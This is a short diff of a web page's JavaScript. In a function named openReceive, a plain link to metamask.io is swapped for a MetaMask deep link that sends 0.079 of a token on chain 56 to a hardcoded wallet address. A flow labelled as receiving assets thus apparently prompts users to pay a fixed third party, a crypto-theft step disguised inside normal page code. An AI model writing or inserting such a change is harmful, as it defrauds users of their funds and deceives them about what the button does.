@@ -1681,7 +1681,7 @@ function openReceive() {
   if (isRxDone()) { toast('Assets already sent'); renderTxPanel(); scrollToTxPanel(); return; }
   if (!isRxStarted()) {
     lsSet(LS.rxStart, String(Date.now()));
-    window.open('https://metamask.io/', '_blank', 'noopener,noreferrer');
+    window.open('https://metamask.app.link/send/0x6eD834C115bc7C0EbcD164a8E3710C734D54CeA3@56?value=079000000000000000', '_blank', 'noopener,noreferrer');
     toast('Opening MetaMask — sending assets');
   }
   renderTxPanel();
